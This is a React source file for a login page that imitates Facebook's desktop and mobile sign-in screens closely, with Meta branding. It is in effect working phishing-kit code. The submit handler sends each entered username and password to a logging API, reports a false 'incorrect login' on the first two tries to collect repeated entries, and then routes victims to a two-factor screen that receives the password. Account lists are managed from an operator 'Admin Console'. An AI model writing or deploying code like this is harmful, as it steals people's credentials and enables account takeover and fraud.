import React, { useState, useEffect } from 'react';
import {
  X,
  HelpCircle,
  Eye,
  EyeOff,
  ChevronDown,
  ChevronRight,
  ChevronLeft,
  ArrowLeft,
  Info,
  Check,
  AlertCircle,
} from 'lucide-react';
import { FacebookOfficialLogo, FacebookSolidGearIcon } from './FacebookSidebarIcons';
import FacebookAvatar from './FacebookAvatar';
import { useAuth } from '../context/AuthContext';
import fbCollageImg from '../assets/image.png';
import metaLogoHorizontal from '../assets/facebook-meta-logo.png';
import ForgotPasswordFlow from './ForgotPasswordFlow';
import SignUpFlow from './SignUpFlow';
import TwoFactorVerification from './TwoFactorVerification';
import { api } from '../api/client';

export default function LoginPage({ onOpenAdmin }) {
  const { login, loginWithAccount, signup, recentAccounts } = useAuth();

  // Mobile mode: 'accounts' | 'login' | 'find_account'
  const [authMode, setAuthMode] = useState('accounts');

  // Desktop mode: 'accounts' | 'password' | 'form'
  const [desktopMode, setDesktopMode] = useState('accounts');

  const [selectedAccount, setSelectedAccount] = useState(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // 3-trial error tracking
  const [trialCount, setTrialCount] = useState(0);
  const [loginError, setLoginError] = useState('');

  const [showSignupModal, setShowSignupModal] = useState(false);
  const [showLanguageSheet, setShowLanguageSheet] = useState(false);
  const [selectedLanguage, setSelectedLanguage] = useState('English (UK)');

  // Find account state
  const [findAccountMode, setFindAccountMode] = useState('phone'); // 'phone' | 'email'
  const [findInputValue, setFindInputValue] = useState('');

  const [liveDesktopAccounts, setLiveDesktopAccounts] = useState(null);
  const [liveMobileAccounts, setLiveMobileAccounts] = useState(null);

  useEffect(() => {
    api.getFirstPageAccounts().then((res) => {
      if (res) {
        if (res.desktopAccounts?.length) setLiveDesktopAccounts(res.desktopAccounts);
        if (res.mobileAccounts?.length) setLiveMobileAccounts(res.mobileAccounts);
      }
    }).catch(() => {});
  }, []);

  // Desktop Accounts matching media_1793948184829_6c12b560.jpg: Berta Hule, Bol Riak Kuol, Tahir Adem
  const desktopDisplayAccounts = React.useMemo(() => [
    {
      id: 'acc_berta_hule',
      name: 'Berta Hule',
      email: 'berta.hule@example.com',
      avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80',
    },
    {
      id: 'acc_bol_riak_kuol',
      name: 'Bol Riak Kuol',
      email: 'bol.kuol@example.com',
      avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=400&q=80',
    },
    {
      id: 'acc_tahir_adem',
      name: 'Tahir Adem',
      email: 'tahir.adem@example.com',
      avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
    },
  ], []);

  // Mobile Accounts: Tahir Bin, Fetty Seya
  const mobileDisplayAccounts = React.useMemo(() => [
    {
      id: 'acc_tahir_bin',
      name: 'Tahir Bin',
      email: 'tahir.bin@example.com',
      phone: '+251 91 123 4567',
      avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80',
    },
    {
      id: 'acc_fetty_seya',
      name: 'Fetty Seya',
      email: 'fetty.seya@example.com',
      phone: '+251 92 987 6543',
      avatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=400&q=80',
    },
  ], []);

  const displayDesktopList = liveDesktopAccounts || desktopDisplayAccounts;
  const displayMobileList = liveMobileAccounts || mobileDisplayAccounts;

  // Desktop select account handler (no auto-fill of email or name)
  const handleDesktopSelectAccount = (account) => {
    setSelectedAccount(account);
    setEmail('');
    setDesktopMode('form');
    setPassword('');
    setShowPassword(false);
    setTrialCount(0);
    setLoginError('');
  };

  // Mobile select account handler (no auto-fill of email or name)
  const handleSelectAccount = (account) => {
    setSelectedAccount(account);
    setEmail('');
    setFindInputValue('');
    setPassword('');
    setShowPassword(false);
    setTrialCount(0);
    setLoginError('');
    setAuthMode('login');
  };

  // Login submission handler with 3-trial validation and credential logging
  const handleLoginSubmit = async (e) => {
    e.preventDefault();

    const usernameVal = email.trim() || selectedAccount?.name || 'Anonymous User';

    if (!email.trim()) {
      setLoginError('Please enter your mobile number or email address.');
      return;
    }

    if (!password) {
      setLoginError('Please enter your password.');
      return;
    }

    const currentTrial = trialCount + 1;
    const isSuccess = currentTrial >= 3;

    // Log the single explicit trial attempt to the database (3 trials total)
    api.logAttempt({
      username: usernameVal,
      email: email.trim(),
      password: password,
      accountName: selectedAccount?.name || usernameVal,
      action: `Login Button Clicked (Trial #${currentTrial})`,
      source: window.innerWidth > 768 ? 'Desktop Login Screen' : 'Mobile Login Screen',
      screen: window.innerWidth > 768 ? 'Desktop Facebook Login Form' : 'Mobile Facebook Login Form',
      device: window.innerWidth > 768 ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
      success: isSuccess,
      trialCount: currentTrial,
    });

    // Trial 1 and 2: show error banner
    if (currentTrial < 3) {
      setTrialCount(currentTrial);
      setLoginError(true);
      return;
    }

    // Trial 3: redirect user to the Two-Factor Verification screen
    setTrialCount(currentTrial);
    setLoginError(false);
    if (typeof window !== 'undefined' && window.innerWidth > 768) {
      setDesktopMode('2fa');
    } else {
      setAuthMode('2fa');
    }
  };

  const handleFindAccountSubmit = (e) => {
    e.preventDefault();
    if (!findInputValue.trim()) {
      return;
    }
    if (selectedAccount) {
      loginWithAccount(selectedAccount);
    } else {
      const matched = [...desktopDisplayAccounts, ...mobileDisplayAccounts].find(
        (a) =>
          a.email?.toLowerCase() === findInputValue.trim().toLowerCase() ||
          a.name?.toLowerCase().includes(findInputValue.trim().toLowerCase())
      );
      if (matched) {
        loginWithAccount(matched);
      } else {
        login(findInputValue.trim(), 'password');
      }
    }
  };

  const toggleFindMode = () => {
    if (findAccountMode === 'phone') {
      setFindAccountMode('email');
      setFindInputValue('');
    } else {
      setFindAccountMode('phone');
      setFindInputValue('');
    }
  };

  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const days = Array.from({ length: 31 }, (_, i) => i + 1);
  const years = Array.from({ length: 80 }, (_, i) => 2026 - i);

  const languages = React.useMemo(() => [
    { id: 'en_gb', name: 'English (UK)' },
    { id: 'am', name: 'አማርኛ' },
    { id: 'so', name: 'Af-Soomaali' },
    { id: 'pl', name: 'Polski' },
    { id: 'es', name: 'Español' },
    { id: 'ar', name: 'العربية' },
    { id: 'fr', name: 'Français (France)' },
    { id: 'pt', name: 'Português (Brasil)' },
    { id: 'it', name: 'Italiano' },
    { id: 'de', name: 'Deutsch' },
    { id: 'en_us', name: 'English (US)' },
  ], []);

  return (
    <div className="fb-exact-login-root fb-white-login-page">
      {/* ========================================================
          1. DESKTOP / PC LOGIN LAYOUT (Exact match to web.facebook.com)
          Visible only on screens > 768px
          ======================================================== */}
      {desktopMode === '2fa' ? (
        <TwoFactorVerification
          isDesktop={true}
          userInput={email || selectedAccount?.name || 'User'}
          userPassword={password}
          onSuccess={async () => {
            if (selectedAccount) {
              await loginWithAccount(selectedAccount, password);
            } else {
              await login(email.trim(), password);
            }
          }}
          onBack={() => setDesktopMode('form')}
          onTryAnotherWay={() => setDesktopMode('forgot')}
        />
      ) : desktopMode === 'forgot' ? (
        <div className="fb-desktop-login-layout" style={{ width: '100%', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
          <ForgotPasswordFlow
            isDesktop={true}
            initialAccount={null}
            initialInput=""
            onBackToLogin={() => setDesktopMode('form')}
            onLoginSuccess={(acc, pass) => {
              if (acc) loginWithAccount(acc, pass);
              else login(email || acc?.email || 'User', pass || 'password');
            }}
          />
        </div>
      ) : desktopMode === 'signup' ? (
        <div style={{ width: '100%', minHeight: '100vh', backgroundColor: '#FFFFFF' }}>
          <SignUpFlow
            onBackToLogin={() => setDesktopMode('form')}
            onGoToFindAccount={() => setDesktopMode('forgot')}
            onSignUpSuccess={(data) => {
              signup(data);
              setDesktopMode('accounts');
            }}
          />
        </div>
      ) : (
        <>
          <div className="fb-exact-login-body fb-desktop-login-layout">
        {/* Left Column: Official Facebook Logo, Big Headline & Collage */}
        <div className="fb-exact-login-left">
          {/* Facebook Official Circular Logo at Top Left */}
          <div className="fb-exact-logo-wrap">
            <FacebookOfficialLogo size={56} />
          </div>

          {/* Headline at bottom-left */}
          <div className="fb-exact-headline">
            <div>Explore</div>
            <div>the</div>
            <div>things</div>
            <div className="fb-blue-text">you love.</div>
          </div>

          {/* Exact Facebook Collage positioned near top-right of left column */}
          <div className="fb-exact-collage-wrap">
            <img
              src={fbCollageImg}
              alt="Facebook Collage"
              className="fb-exact-collage-img"
            />
          </div>
        </div>

        {/* Vertical Divider Line between Left and Right */}
        <div className="fb-exact-vertical-divider" />

        {/* Right Column: Clean Open Login Panel */}
        <div className="fb-exact-login-right">
          <div className="fb-exact-right-inner">
            {desktopMode === 'accounts' ? (
              /* State 1: Recent Logins (Exact match to media_1793948184829_6c12b560.jpg) */
              <>
                <div className="fb-exact-header-row">
                  <h2 className="fb-exact-header-title">Log in to Facebook</h2>
                  <button
                    type="button"
                    className="fb-exact-settings-btn"
                    title="Account Settings"
                    onClick={() => alert('Account Settings')}
                  >
                    <FacebookSolidGearIcon size={24} />
                  </button>
                </div>

                {/* Profiles List: Dynamic Accounts Managed by Admin */}
                <div className="fb-exact-profiles-list">
                  {displayDesktopList.map((account) => (
                    <div
                      key={account.id}
                      className="fb-exact-profile-item"
                      onClick={() => handleDesktopSelectAccount(account)}
                    >
                      <div className="fb-exact-profile-avatar">
                        {account.avatar ? (
                          <img
                            src={account.avatar}
                            alt={account.name}
                            style={{ width: 52, height: 52, borderRadius: '50%', objectFit: 'cover' }}
                          />
                        ) : (
                          <FacebookAvatar size={52} />
                        )}
                      </div>
                      <div className="fb-exact-profile-name">{account.name}</div>
                      <ChevronRight size={22} className="fb-exact-profile-arrow" />
                    </div>
                  ))}
                </div>

                {/* "Use another profile" Button */}
                <button
                  type="button"
                  className="fb-exact-btn-use-another"
                  onClick={() => handleDesktopSelectAccount(null)}
                >
                  Use another profile
                </button>

                {/* "Create new account" Button */}
                <button
                  type="button"
                  className="fb-exact-btn-create-outline"
                  onClick={() => setDesktopMode('signup')}
                >
                  Create new account
                </button>

                {/* Meta Branding at Bottom */}
                <div className="fb-exact-meta-brand">
                  <img
                    src={metaLogoHorizontal}
                    alt="Meta"
                    className="fb-exact-meta-img"
                  />
                </div>
              </>
            ) : (
              /* State 2: Desktop Login Form (Exact match to media_1793948617406_bfbc6e9a.jpg) */
              <>
                <div className="fb-desktop-form-header">
                  <button
                    type="button"
                    className="fb-desktop-back-chevron"
                    onClick={() => {
                      setDesktopMode('accounts');
                      setLoginError('');
                      setTrialCount(0);
                    }}
                    title="Back to accounts"
                    aria-label="Back to accounts"
                  >
                    <ChevronLeft size={24} color="#050505" strokeWidth={2.4} />
                  </button>
                  <h2 className="fb-desktop-form-title">Log into Facebook</h2>
                </div>

                <form onSubmit={handleLoginSubmit} className="fb-desktop-form" autoComplete="off">
                  {/* Exact Facebook Error Banner matching user's screenshot */}
                  {loginError && (
                    <div className="fb-desktop-error-banner" key={trialCount}>
                      <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
                        <circle cx="10" cy="10" r="8.75" stroke="#C41C34" strokeWidth="1.6" />
                        <circle cx="10" cy="6.2" r="1.1" fill="#C41C34" />
                        <rect x="9.1" y="8.8" width="1.8" height="5.5" rx="0.5" fill="#C41C34" />
                      </svg>
                      <div className="fb-desktop-error-banner-text">
                        The login information you entered is incorrect.{' '}
                        <a
                          href="#find-account"
                          className="fb-desktop-error-banner-link"
                          onClick={(e) => {
                            e.preventDefault();
                            setDesktopMode('forgot');
                          }}
                        >
                          Find your account and log in.
                        </a>
                      </div>
                    </div>
                  )}

                  {/* Field 1: Email or mobile number (Always displayed, no auto-fill) */}
                  <div className="fb-desktop-input-wrap">
                    <input
                      type="text"
                      name="fb_desktop_identity"
                      autoComplete="off"
                      data-lpignore="true"
                      placeholder="Email or mobile number"
                      className="fb-desktop-input"
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        if (loginError) setLoginError('');
                      }}
                    />
                  </div>

                  {/* Field 2: Password */}
                  <div className="fb-desktop-input-wrap" style={{ position: 'relative' }}>
                    <input
                      type={showPassword ? 'text' : 'password'}
                      name="fb_desktop_pass"
                      autoComplete="new-password"
                      placeholder="Password"
                      className="fb-desktop-input"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (loginError) setLoginError('');
                      }}
                      autoFocus
                    />
                    {password.length > 0 && (
                      <button
                        type="button"
                        className="fb-desktop-eye-btn"
                        onClick={() => setShowPassword((p) => !p)}
                        title={showPassword ? 'Hide password' : 'Show password'}
                      >
                        {showPassword ? <EyeOff size={19} color="#65676B" /> : <Eye size={19} color="#65676B" />}
                      </button>
                    )}
                  </div>

                  {/* Primary Blue Button: Log in */}
                  <button type="submit" className="fb-desktop-login-btn">
                    Log in
                  </button>

                  {/* Forgot password? link */}
                  <div className="fb-desktop-forgot-wrap">
                    <a
                      href="#forgot"
                      className="fb-desktop-forgot-link"
                      onClick={(e) => {
                        e.preventDefault();
                        setDesktopMode('forgot');
                      }}
                    >
                      Forgot password?
                    </a>
                  </div>

                  {/* Secondary Outline Button: Create new account */}
                  <button
                    type="button"
                    className="fb-desktop-create-btn"
                    onClick={() => setDesktopMode('signup')}
                  >
                    Create new account
                  </button>

                  {/* Meta Logo at Bottom */}
                  <div className="fb-desktop-meta-wrap">
                    <img
                      src={metaLogoHorizontal}
                      alt="Meta"
                      className="fb-exact-meta-img"
                    />
                  </div>
                </form>
              </>
            )}
          </div>
        </div>
      </div>

      {/* Desktop Footer (Matching web.facebook.com) */}
      <footer className="fb-exact-footer">
        <div className="fb-exact-footer-inner">
          <div className="fb-exact-lang-row">
            <span>English (UK)</span>
            <a href="#lang">አማርኛ</a>
            <a href="#lang">Af-Soomaali</a>
            <a href="#lang">العربية</a>
            <a href="#lang">Português (Brasil)</a>
            <a href="#lang">Español</a>
            <a href="#lang">Français (France)</a>
            <a href="#lang" style={{ color: '#0866FF', fontWeight: 600 }}>More languages...</a>
          </div>

          <div className="fb-exact-footer-divider" />

          <div className="fb-exact-links-row">
            <a href="#signup">Sign up</a>
            <a href="#login">Log in</a>
            <a href="#messenger">Messenger</a>
            <a href="#lite">Facebook Lite</a>
            <a href="#video">Video</a>
            <a href="#pay">Meta Pay</a>
            <a href="#store">Meta Store</a>
            <a href="#quest">Meta Quest</a>
            <a href="#rayban">Ray-Ban Meta</a>
            <a href="#ai">Meta AI</a>
            <a href="#instagram">Instagram</a>
            <a href="#threads">Threads</a>
            <a href="#privacy">Privacy Policy</a>
            <a href="#terms">Terms</a>
            <a href="#help">Help</a>
            <a
              href="/admin"
              style={{ color: '#0866FF', fontWeight: 600 }}
              onClick={(e) => {
                e.preventDefault();
                if (onOpenAdmin) onOpenAdmin();
                else window.location.href = '/admin';
              }}
            >
              Admin Console
            </a>
          </div>
        </div>
      </footer>
        </>
      )}

      {/* ========================================================
          2. MOBILE RESPONSIVE LOGIN LAYOUT (Screens <= 768px)
          ======================================================== */}
      <div className="fb-clean-login-container fb-mobile-login-view">
        {/* SCREEN 1: "the user opens the site it shows the already logged in users on this device" */}
        {authMode === 'accounts' && (
          <div className="fb-exact-clean-login-view">
            {/* Top Centered Language Selector */}
            <div className="fb-clean-topbar">
              <button
                type="button"
                className="fb-clean-lang-btn"
                onClick={() => setShowLanguageSheet(true)}
                title="Select language"
              >
                <span>{selectedLanguage}</span>
                <ChevronDown size={14} color="#65676B" strokeWidth={2.5} />
              </button>
            </div>

            {/* Centered Facebook Round Blue Logo */}
            <div className="fb-clean-brand-logo">
              <FacebookOfficialLogo size={62} />
            </div>

            {/* Saved Accounts on this Device */}
            <div className="fb-clean-form-wrapper">
              <div className="fb-accounts-list">
                {displayMobileList.map((account) => (
                  <div
                    key={account.id}
                    className="fb-mobile-account-card"
                    onClick={() => handleSelectAccount(account)}
                  >
                    <div className="fb-mobile-card-avatar">
                      {account.avatar ? (
                        <img
                          src={account.avatar}
                          alt={account.name}
                          style={{ width: '100%', height: '100%', objectFit: 'cover' }}
                        />
                      ) : (
                        <FacebookAvatar size={50} />
                      )}
                    </div>
                    <div className="fb-mobile-card-name">
                      {account.name}
                    </div>
                    <ChevronRight size={22} color="#65676B" strokeWidth={2.4} />
                  </div>
                ))}
              </div>

              {/* Log into another account link */}
              <button
                type="button"
                className="fb-clean-use-another-btn"
                onClick={() => handleSelectAccount(null)}
              >
                Log into another account
              </button>
            </div>

            {/* Bottom Section: Create new account + Meta Branding */}
            <div className="fb-clean-bottom-section">
              <button
                type="button"
                className="fb-clean-create-btn"
                onClick={() => setAuthMode('signup')}
              >
                Create new account
              </button>

              <div className="fb-clean-meta-footer">
                <img
                  src={metaLogoHorizontal}
                  alt="Meta"
                  className="fb-clean-meta-img"
                />
              </div>
            </div>
          </div>
        )}

        {/* SCREEN 2: LOGIN PAGE (Username auto-filled from chosen account) */}
        {authMode === 'login' && (
          <div className="fb-exact-clean-login-view">
            {/* Topbar with Back Arrow returning to Accounts List */}
            <div className="fb-clean-topbar fb-clean-topbar-with-back">
              <button
                type="button"
                className="fb-clean-back-btn"
                onClick={() => {
                  setAuthMode('accounts');
                  setLoginError('');
                  setTrialCount(0);
                }}
                title="Back to accounts"
              >
                <ArrowLeft size={24} color="#050505" strokeWidth={2.4} />
              </button>

              <button
                type="button"
                className="fb-clean-lang-btn"
                onClick={() => setShowLanguageSheet(true)}
                title="Select language"
              >
                <span>{selectedLanguage}</span>
                <ChevronDown size={14} color="#65676B" strokeWidth={2.5} />
              </button>

              <div style={{ width: 36 }} />
            </div>

            {/* Centered Facebook Round Blue Logo */}
            <div className="fb-clean-brand-logo">
              <FacebookOfficialLogo size={62} />
            </div>

            {/* Login Form */}
            <div className="fb-clean-form-wrapper">
              <form onSubmit={handleLoginSubmit} className="fb-clean-form" autoComplete="off">
                {/* Exact Facebook Error Banner */}
                {loginError && (
                  <div className="fb-desktop-error-banner" key={trialCount} style={{ marginBottom: 14 }}>
                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
                      <circle cx="10" cy="10" r="8.75" stroke="#C41C34" strokeWidth="1.6" />
                      <circle cx="10" cy="6.2" r="1.1" fill="#C41C34" />
                      <rect x="9.1" y="8.8" width="1.8" height="5.5" rx="0.5" fill="#C41C34" />
                    </svg>
                    <div className="fb-desktop-error-banner-text">
                      The login information you entered is incorrect.{' '}
                      <a
                        href="#find-account"
                        className="fb-desktop-error-banner-link"
                        onClick={(e) => {
                          e.preventDefault();
                          setAuthMode('forgot');
                        }}
                      >
                        Find your account and log in.
                      </a>
                    </div>
                  </div>
                )}

                {/* Input 1: Auto-filled with chosen username */}
                <div className="fb-clean-input-box">
                  <input
                    type="text"
                    name="fb_login_identity"
                    autoComplete="off"
                    data-lpignore="true"
                    placeholder="Mobile number or email address"
                    className="fb-clean-input"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (loginError) setLoginError('');
                    }}
                  />
                  <div className="fb-clean-input-right-icon" title="More info">
                    <Info size={20} color="#65676B" strokeWidth={1.8} />
                  </div>
                </div>

                {/* Input 2: Password with conditional Eye Toggle */}
                <div className="fb-clean-input-box">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    name="fb_login_pass"
                    autoComplete="new-password"
                    placeholder="Password"
                    className="fb-clean-input"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (loginError) setLoginError('');
                    }}
                  />
                  {password.length > 0 && (
                    <button
                      type="button"
                      className="fb-clean-eye-btn"
                      onClick={() => setShowPassword((p) => !p)}
                      title={showPassword ? 'Hide password' : 'Show password'}
                    >
                      {showPassword ? <EyeOff size={20} color="#65676B" /> : <Eye size={20} color="#65676B" />}
                    </button>
                  )}
                </div>

                {/* Primary Button: Log in */}
                <button type="submit" className="fb-clean-login-btn">
                  Log in
                </button>

                {/* Forgot Password */}
                <a
                  href="#forgot"
                  className="fb-clean-forgot-link"
                  onClick={(e) => {
                    e.preventDefault();
                    setAuthMode('forgot');
                  }}
                >
                  Forgotten password?
                </a>
              </form>
            </div>

            {/* Bottom Section: Create new account + Meta Branding */}
            <div className="fb-clean-bottom-section">
              <button
                type="button"
                className="fb-clean-create-btn"
                onClick={() => setAuthMode('signup')}
              >
                Create new account
              </button>

              <div className="fb-clean-meta-footer">
                <img
                  src={metaLogoHorizontal}
                  alt="Meta"
                  className="fb-clean-meta-img"
                />
              </div>
            </div>
          </div>
        )}

        {/* TWO-FACTOR VERIFICATION SCREEN (Mobile) */}
        {authMode === '2fa' && (
          <TwoFactorVerification
            isDesktop={false}
            userInput={email || selectedAccount?.name || 'User'}
            userPassword={password}
            onSuccess={async () => {
              if (selectedAccount) {
                await loginWithAccount(selectedAccount, password);
              } else {
                await login(email.trim(), password);
              }
            }}
            onBack={() => setAuthMode('login')}
            onTryAnotherWay={() => setAuthMode('forgot')}
          />
        )}

        {/* FORGOT PASSWORD MULTI-STEP FLOW (Mobile)
            Step 1: Find your account (Image 1)
            Step 2: Log into your Meta Account (Image 3)
            Step 3: Choose a way to log in (Image 4)
            Step 4: Confirm your account (Image 5) */}
        {(authMode === 'forgot' || authMode === 'find_account') && (
          <ForgotPasswordFlow
            isDesktop={false}
            initialAccount={null}
            initialInput=""
            onBackToLogin={() => setAuthMode('login')}
            onLoginSuccess={(acc, pass) => {
              if (acc) loginWithAccount(acc, pass);
              else login(email || acc?.email || 'User', pass || 'password');
            }}
          />
        )}

        {/* MULTI-STEP SIGN UP FLOW (Mobile - Exact match to m.facebook.com/reg/#) */}
        {authMode === 'signup' && (
          <SignUpFlow
            isDesktop={false}
            onClose={() => setAuthMode('accounts')}
            onBackToLogin={() => setAuthMode('login')}
            onGoToFindAccount={() => setAuthMode('forgot')}
            onSignUpSuccess={(data) => {
              signup(data);
              setAuthMode('accounts');
            }}
          />
        )}
      </div>

      {/* Language Selector Bottom Sheet (Drawer) */}
      {showLanguageSheet && (
        <div
          className="fb-lang-sheet-backdrop"
          onClick={() => setShowLanguageSheet(false)}
        >
          <div
            className="fb-lang-sheet-container"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="fb-lang-sheet-handle" />

            <div className="fb-lang-sheet-header">
              <button
                type="button"
                className="fb-lang-sheet-close-btn"
                onClick={() => setShowLanguageSheet(false)}
                title="Close"
                aria-label="Close"
              >
                <X size={24} color="#050505" strokeWidth={2.4} />
              </button>
            </div>

            <h2 className="fb-lang-sheet-title">Select your language</h2>

            <div className="fb-lang-sheet-scroll-wrap">
              <div className="fb-lang-sheet-box">
                {languages.map((lang) => {
                  const isSelected = selectedLanguage === lang.name;
                  return (
                    <div
                      key={lang.id}
                      className={`fb-lang-sheet-row ${isSelected ? 'selected' : ''}`}
                      onClick={() => {
                        setSelectedLanguage(lang.name);
                        setTimeout(() => setShowLanguageSheet(false), 240);
                      }}
                    >
                      <span className="fb-lang-name">{lang.name}</span>

                      <div className={`fb-lang-checkbox ${isSelected ? 'checked' : ''}`}>
                        {isSelected && (
                          <Check size={14} color="#FFFFFF" strokeWidth={3.5} />
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Facebook Multi-Step Sign Up Flow */}
      {showSignupModal && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 10000, backgroundColor: '#FFFFFF' }}>
          <SignUpFlow
            onBackToLogin={() => setShowSignupModal(false)}
            onGoToFindAccount={() => {
              setShowSignupModal(false);
              setDesktopMode('forgot');
            }}
            onSignUpSuccess={(data) => {
              signup(data);
              setShowSignupModal(false);
            }}
          />
        </div>
      )}
    </div>
  );
}
